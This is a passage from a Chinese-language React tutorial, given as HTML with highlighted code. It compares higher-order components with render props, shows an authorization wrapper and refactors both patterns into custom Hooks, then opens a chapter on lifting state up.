class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">useCounter</span>(<span class="hljs-params">initialCount = <span class="hljs-number">0</span></span>) &#123;<br>  <span class="hljs-keyword">const</span> [count, setCount] = <span class="hljs-title function_">useState</span>(initialCount);<br>  <br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">increment</span> = (<span class="hljs-params"></span>) =&gt; <span class="hljs-title function_">setCount</span>(<span class="hljs-function"><span class="hljs-params">c</span> =&gt;</span> c + <span class="hljs-number">1</span>);<br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">decrement</span> = (<span class="hljs-params"></span>) =&gt; <span class="hljs-title function_">setCount</span>(<span class="hljs-function"><span class="hljs-params">c</span> =&gt;</span> c - <span class="hljs-number">1</span>);<br>  <br>  <span class="hljs-keyword">return</span> &#123; count, increment, decrement &#125;;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Counter</span>(<span class="hljs-params">&#123; children &#125;</span>) &#123;<br>  <span class="hljs-keyword">const</span> counter = <span class="hljs-title function_">useCounter</span>();<br>  <span class="hljs-keyword">return</span> <span class="hljs-title function_">children</span>(counter);<br>&#125;<br><br><span class="hljs-comment">// 使用</span><br>&lt;<span class="hljs-title class_">Counter</span>&gt;<br>  &#123;<span class="hljs-function">(<span class="hljs-params">&#123; count, increment, decrement &#125;</span>) =&gt;</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;decrement&#125;</span>&gt;</span>-<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>&#123;count&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;increment&#125;</span>&gt;</span>+<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  )&#125;<br>&lt;/<span class="hljs-title class_">Counter</span>&gt;<br></code></pre></td></tr></table></figure><h3 id="HOC-与-Render-Props-对比"><a href="#HOC-与-Render-Props-对比" class="headerlink" title="HOC 与 Render Props 对比"></a>HOC 与 Render Props 对比</h3><p><strong>技术对比</strong></p><pre class="mermaid">graph LR    A[HOC] --> B[属性代理]    A --> C[反向继承]    D[Render Props] --> E[函数作为子组件]    D --> F[Render Prop]        B --> G[注入Props]    C --> H[操作组件]    E --> I[直接组合]    F --> I</pre><p><strong>详细对比分析</strong></p><table><thead><tr><th align="left">特性</th><th align="left">高阶组件 (HOC)</th><th align="left">Render Props</th></tr></thead><tbody><tr><td align="left">复用方式</td><td align="left">组件作为参数返回增强组件</td><td align="left">函数作为prop渲染内容</td></tr><tr><td align="left">组件关系</td><td align="left">包装关系</td><td align="left">包含关系</td></tr><tr><td align="left">调试难度</td><td align="left">较难（多层包装）</td><td align="left">较易（直接显示）</td></tr><tr><td align="left">静态类型</td><td align="left">类型推导复杂</td><td align="left">类型推导简单</td></tr><tr><td align="left">灵活性</td><td align="left">中等</td><td align="left">高</td></tr><tr><td align="left">性能影响</td><td align="left">可能引起额外渲染</td><td align="left">可能引起额外渲染</td></tr><tr><td align="left">学习曲线</td><td align="left">较陡峭</td><td align="left">较平缓</td></tr><tr><td align="left">适用场景</td><td align="left">横切关注点</td><td align="left">动态组合</td></tr></tbody></table><h3 id="企业级最佳实践-2"><a href="#企业级最佳实践-2" class="headerlink" title="企业级最佳实践"></a>企业级最佳实践</h3><p><strong>权限控制</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">withAuthorization</span>(<span class="hljs-params">requiredRoles</span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-function"><span class="hljs-params">WrappedComponent</span> =&gt;</span> &#123;<br>    <span class="hljs-keyword">const</span> <span class="hljs-title function_">AuthorizedComponent</span> = props =&gt; &#123;<br>      <span class="hljs-keyword">const</span> &#123; user &#125; = <span class="hljs-title function_">useAuth</span>();<br>      <br>      <span class="hljs-keyword">if</span> (!user || !requiredRoles.<span class="hljs-title function_">some</span>(<span class="hljs-function"><span class="hljs-params">role</span> =&gt;</span> user.<span class="hljs-property">roles</span>.<span class="hljs-title function_">includes</span>(role))) &#123;<br>        <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ForbiddenPage</span> /&gt;</span></span>;<br>      &#125;<br>      <br>      <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">WrappedComponent</span> &#123;<span class="hljs-attr">...props</span>&#125; /&gt;</span></span>;<br>    &#125;;<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">AuthorizedComponent</span>;<br>  &#125;;<br>&#125;<br><br><span class="hljs-comment">// 使用</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">AdminDashboard</span> = <span class="hljs-title function_">withAuthorization</span>([<span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;superadmin&#x27;</span>])(<span class="hljs-title class_">Dashboard</span>);<br></code></pre></td></tr></table></figure><h3 id="现代替代方案：自定义-Hooks"><a href="#现代替代方案：自定义-Hooks" class="headerlink" title="现代替代方案：自定义 Hooks"></a>现代替代方案：自定义 Hooks</h3><p><strong>重构 HOC 为 Hook</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 原 HOC</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">withWindowSize</span>(<span class="hljs-params">WrappedComponent</span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">extends</span> <span class="hljs-title class_">React</span>.<span class="hljs-property">Component</span> &#123;<br>    state = &#123; <span class="hljs-attr">width</span>: <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerWidth</span>, <span class="hljs-attr">height</span>: <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerHeight</span> &#125;;<br>    <br>    handleResize = <span class="hljs-function">() =&gt;</span> &#123;<br>      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setState</span>(&#123;<br>        <span class="hljs-attr">width</span>: <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerWidth</span>,<br>        <span class="hljs-attr">height</span>: <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerHeight</span><br>      &#125;);<br>    &#125;;<br>    <br>    <span class="hljs-title function_">componentDidMount</span>(<span class="hljs-params"></span>) &#123;<br>      <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;resize&#x27;</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">handleResize</span>);<br>    &#125;<br>    <br>    <span class="hljs-title function_">componentWillUnmount</span>(<span class="hljs-params"></span>) &#123;<br>      <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">&#x27;resize&#x27;</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">handleResize</span>);<br>    &#125;<br>    <br>    <span class="hljs-title function_">render</span>(<span class="hljs-params"></span>) &#123;<br>      <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">WrappedComponent</span> &#123;<span class="hljs-attr">...this.props</span>&#125; <span class="hljs-attr">windowSize</span>=<span class="hljs-string">&#123;this.state&#125;</span> /&gt;</span></span>;<br>    &#125;<br>  &#125;;<br>&#125;<br><br><span class="hljs-comment">// 自定义 Hook</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">useWindowSize</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [size, setSize] = <span class="hljs-title function_">useState</span>(&#123;<br>    <span class="hljs-attr">width</span>: <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerWidth</span>,<br>    <span class="hljs-attr">height</span>: <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerHeight</span><br>  &#125;);<br>  <br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleResize</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>      <span class="hljs-title function_">setSize</span>(&#123;<br>        <span class="hljs-attr">width</span>: <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerWidth</span>,<br>        <span class="hljs-attr">height</span>: <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerHeight</span><br>      &#125;);<br>    &#125;;<br>    <br>    <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;resize&#x27;</span>, handleResize);<br>    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">&#x27;resize&#x27;</span>, handleResize);<br>  &#125;, []);<br>  <br>  <span class="hljs-keyword">return</span> size;<br>&#125;<br><br><span class="hljs-comment">// 使用</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">ResponsiveComponent</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> &#123; width &#125; = <span class="hljs-title function_">useWindowSize</span>();<br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>窗口宽度: &#123;width&#125;px<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>重构 Render Props 为 Hook</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 原 Render Prop 组件</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">DataFetcher</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">React.Component</span> &#123;<br>  state = &#123; <span class="hljs-attr">data</span>: <span class="hljs-literal">null</span>, <span class="hljs-attr">loading</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">error</span>: <span class="hljs-literal">null</span> &#125;;<br>  <br>  <span class="hljs-title function_">componentDidMount</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-title function_">fetch</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">props</span>.<span class="hljs-property">url</span>)<br>      .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> res.<span class="hljs-title function_">json</span>())<br>      .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setState</span>(&#123; data, <span class="hljs-attr">loading</span>: <span class="hljs-literal">false</span> &#125;))<br>      .<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setState</span>(&#123; error, <span class="hljs-attr">loading</span>: <span class="hljs-literal">false</span> &#125;));<br>  &#125;<br>  <br>  <span class="hljs-title function_">render</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">props</span>.<span class="hljs-title function_">children</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span>);<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// 自定义 Hook</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">useDataFetcher</span>(<span class="hljs-params">url</span>) &#123;<br>  <span class="hljs-keyword">const</span> [state, setState] = <span class="hljs-title function_">useState</span>(&#123; <br>    <span class="hljs-attr">data</span>: <span class="hljs-literal">null</span>, <br>    <span class="hljs-attr">loading</span>: <span class="hljs-literal">true</span>, <br>    <span class="hljs-attr">error</span>: <span class="hljs-literal">null</span> <br>  &#125;);<br>  <br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-title function_">setState</span>(<span class="hljs-function"><span class="hljs-params">prev</span> =&gt;</span> (&#123; ...prev, <span class="hljs-attr">loading</span>: <span class="hljs-literal">true</span> &#125;));<br>    <br>    <span class="hljs-title function_">fetch</span>(url)<br>      .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> res.<span class="hljs-title function_">json</span>())<br>      .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> <span class="hljs-title function_">setState</span>(&#123; data, <span class="hljs-attr">loading</span>: <span class="hljs-literal">false</span>, <span class="hljs-attr">error</span>: <span class="hljs-literal">null</span> &#125;))<br>      .<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> <span class="hljs-title function_">setState</span>(&#123; <span class="hljs-attr">data</span>: <span class="hljs-literal">null</span>, <span class="hljs-attr">loading</span>: <span class="hljs-literal">false</span>, error &#125;));<br>  &#125;, [url]);<br>  <br>  <span class="hljs-keyword">return</span> state;<br>&#125;<br><br><span class="hljs-comment">// 使用</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">UserProfile</span>(<span class="hljs-params">&#123; userId &#125;</span>) &#123;<br>  <span class="hljs-keyword">const</span> &#123; data, loading &#125; = <span class="hljs-title function_">useDataFetcher</span>(<span class="hljs-string">`/api/users/<span class="hljs-subst">$&#123;userId&#125;</span>`</span>);<br>  <br>  <span class="hljs-keyword">if</span> (loading) <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Spinner</span> /&gt;</span></span>;<br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ProfileCard</span> <span class="hljs-attr">user</span>=<span class="hljs-string">&#123;data&#125;</span> /&gt;</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="设计模式选择指南"><a href="#设计模式选择指南" class="headerlink" title="设计模式选择指南"></a>设计模式选择指南</h3><p><strong>模式选择决策</strong></p><pre class="mermaid">graph TD    A[需要逻辑复用] --> B{需要访问组件内部?}    B -->|是| C[Render Props]    B -->|否| D{需要包装组件?}    D -->|是| E[HOC]    D -->|否| F[自定义 Hook]    C --> G{功能简单?}    G -->|是| H[Render Props]    G -->|否| I[自定义 Hook]</pre><p><strong>场景化建议</strong></p><ul><li>跨组件共享逻辑：HOC（如 Redux connect）</li><li>动态组合UI：Render Props（如 Context.Consumer）</li><li>功能复用：自定义 Hooks（如 useForm）</li><li>类组件扩展：HOC（如 withRouter）</li><li>函数组件扩展：自定义 Hooks（如 useEffect）</li></ul><h3 id="面试高频问题解析-2"><a href="#面试高频问题解析-2" class="headerlink" title="面试高频问题解析"></a>面试高频问题解析</h3><p><strong>Q：HOC 和 Render Props 的主要区别是什么？</strong></p><ul><li>HOC：组件工厂模式，通过包装组件增强功能，可能引入多层嵌套</li><li>Render Props：回调模式，通过函数 prop 共享状态，更直接但可能嵌套回调</li><li>关键区别：HOC 创建新组件，Render Props 动态组合组件</li></ul><p><strong>Q：使用 HOC 时如何避免命名冲突？</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">withEnhancedProps</span>(<span class="hljs-params">WrappedComponent</span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">extends</span> <span class="hljs-title class_">React</span>.<span class="hljs-property">Component</span> &#123;<br>    <span class="hljs-title function_">render</span>(<span class="hljs-params"></span>) &#123;<br>      <span class="hljs-comment">// 使用命名空间避免冲突</span><br>      <span class="hljs-keyword">const</span> enhancedProps = &#123;<br>        <span class="hljs-attr">hoc</span>: &#123;<br>          <span class="hljs-attr">data</span>: <span class="hljs-string">&#x27;hoc data&#x27;</span>,<br>          <span class="hljs-attr">method</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;HOC method&#x27;</span>)<br>        &#125;,<br>        ...<span class="hljs-variable language_">this</span>.<span class="hljs-property">props</span><br>      &#125;;<br>      <br>      <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">WrappedComponent</span> &#123;<span class="hljs-attr">...enhancedProps</span>&#125; /&gt;</span></span>;<br>    &#125;<br>  &#125;;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>Q：Render Props 会导致性能问题吗？如何优化？</strong></p><p>优化策略：</p><p>(1) 避免内联函数</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 不推荐：每次渲染创建新函数</span><br>&lt;<span class="hljs-title class_">DataProvider</span> render=&#123;<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Child</span> <span class="hljs-attr">data</span>=<span class="hljs-string">&#123;data&#125;</span> /&gt;</span></span>&#125; /&gt;<br><br><span class="hljs-comment">// 推荐：使用实例方法</span><br>renderData = <span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Child</span> <span class="hljs-attr">data</span>=<span class="hljs-string">&#123;data&#125;</span> /&gt;</span></span>;<br><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">DataProvider</span> <span class="hljs-attr">render</span>=<span class="hljs-string">&#123;this.renderData&#125;</span> /&gt;</span></span><br></code></pre></td></tr></table></figure><p>(2) 使用 PureComponent&#x2F;memo</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">OptimizedProvider</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">React.PureComponent</span> &#123;<br>  <span class="hljs-comment">// 仅当 props 变化时重新渲染</span><br>&#125;<br></code></pre></td></tr></table></figure><p>(3) 分离渲染职责</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">SplitProvider</span>(<span class="hljs-params">&#123; children &#125;</span>) &#123;<br>  <span class="hljs-keyword">const</span> data = <span class="hljs-title function_">useData</span>();<br>  <span class="hljs-keyword">const</span> ui = <span class="hljs-title function_">useUI</span>();<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">DataContext.Provider</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;data&#125;</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">UIContext.Provider</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;ui&#125;</span>&gt;</span></span><br><span class="language-xml">        &#123;children&#125;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">UIContext.Provider</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">DataContext.Provider</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>Q：何时应该选择自定义 Hooks 替代 HOC 或 Render Props？</strong></p><ul><li>选择自定义 Hooks 当：<ul><li>复用逻辑不依赖 React 生命周期</li><li>需要在多个组件中使用相同逻辑</li><li>项目主要使用函数组件</li><li>希望减少组件嵌套层级</li></ul></li><li>保留 HOC&#x2F;Render Props 当：<ul><li>维护类组件代码库</li><li>需要操作组件实例（如 refs）</li><li>需要访问组件的生命周期方法</li><li>需要包装组件（如添加错误边界）</li></ul></li></ul><h3 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h3><ul><li>高阶组件 (HOC)：<ul><li>本质：组件工厂函数（输入组件 → 输出增强组件）</li><li>模式：属性代理、反向继承</li><li>适用：横切关注点、类组件扩展</li><li>注意：ref 传递、命名冲突、静态方法</li></ul></li><li>Render Props：<ul><li>本质：通过函数 prop 共享状态</li><li>模式：render prop 或 children as function</li><li>适用：动态组合、复杂状态共享</li><li>注意：回调嵌套、性能优化</li></ul></li><li>现代演进：<ul><li>自定义 Hooks 成为函数组件首选</li><li>HOC 和 Render Props 仍适合特定场景</li><li>三种模式可混合使用</li></ul></li><li>设计原则：<ul><li>单一职责原则</li><li>开闭原则（对扩展开放，对修改关闭）</li><li>组合优于继承</li></ul></li><li>企业实践：<ul><li>复杂状态管理</li><li>权限控制</li><li>性能优化</li><li>类型安全（TypeScript）</li></ul></li><li>面试重点：<ul><li>HOC 与 Render Props 区别</li><li>命名冲突解决方案</li><li>性能优化策略</li><li>模式选择决策</li></ul></li></ul><h1 id="第五章：React-状态管理"><a href="#第五章：React-状态管理" class="headerlink" title="第五章：React 状态管理"></a>第五章：React 状态管理</h1><h2 id="5-1-状态提升与单向数据流"><a href="#5-1-状态提升与单向数据流" class="headerlink" title="5.1 状态提升与单向数据流"></a>5.1 状态提升与单向数据流</h2><h3 id="核心概念全景图"><a href="#核心概念全景图" class="headerlink" title="核心概念全景图"></a>核心概念全景图</h3><pre class="mermaid">graph TD  A[状态管理方案] --> B[组件内部状态]  A --> C[状态提升]  A --> D[全局状态管理]  C --> E[父子组件通信]  C --> F[兄弟组件通信]</pre><h3 id="状态提升（Lifting-State-Up）深度解析"><a href="#状态提升（Lifting-State-Up）深度解析" class="headerlink" title="状态提升（Lifting State Up）深度解析"></a>状态提升（Lifting State Up）深度解析</h3><p><strong>基本定义</strong><br>将多个组件需要共享的状态提升到它们最近的公共父组件中管理，通过 props 向下传递数据，通过回调函数向上传递状态变更</p><p><strong>解决什么问题</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 问题场景：两个独立组件需要同步状态</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">TemperatureInputA</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [temp, setTemp] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>); <span class="hljs-comment">// 独立状态</span><br>  <span class="hljs-comment">// ...</span><br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">TemperatureInputB</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [temp, setTemp] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>); <span class="hljs-comment">// 独立状态</span><br>  <span class="hljs-comment">// ...</span><br>&#125;<br><br><span class="hljs-comment">// 无法保持两个输入框温度值同步</span><br></code></pre></td></tr></table></figure><p><strong>解决方案</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Parent</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-comment">// 1. 状态提升到公共父组件</span><br>  <span class="hljs-keyword">const</span> [temperature, setTemperature] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>);<br>  <br>  <span class="hljs-comment">// 2. 通过props传递状态</span><br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">TemperatureInput</span> </span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;temperature&#125;</span> </span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">onChange</span>=<span class="hljs-string">&#123;setTemperature&#125;</span> // <span class="hljs-attr">3.</span> <span class="hljs-attr">传递回调函数</span></span></span><br><span class="hljs-tag"><span class="language-xml">      /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">TemperatureDisplay</span> </span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;temperature&#125;</span> </span></span><br><span class="hljs-tag"><span class="language-xml">      /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  );<br>&#125;<br><br><span class="hljs-comment">// 子组件成为受控组件</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">TemperatureInput</span>(<span class="hljs-params">&#123; value, onChange &#125;</span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> </span></span><br><span class="hljs-tag"><span class="language-xml">      <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;number&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">      <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;value&#125;</span></span></span><br><span class="hljs-tag"><span class="language-xml">      <span class="hljs-attr">onChange</span>=<span class="hljs-string">&#123;(e)</span> =&gt;</span> 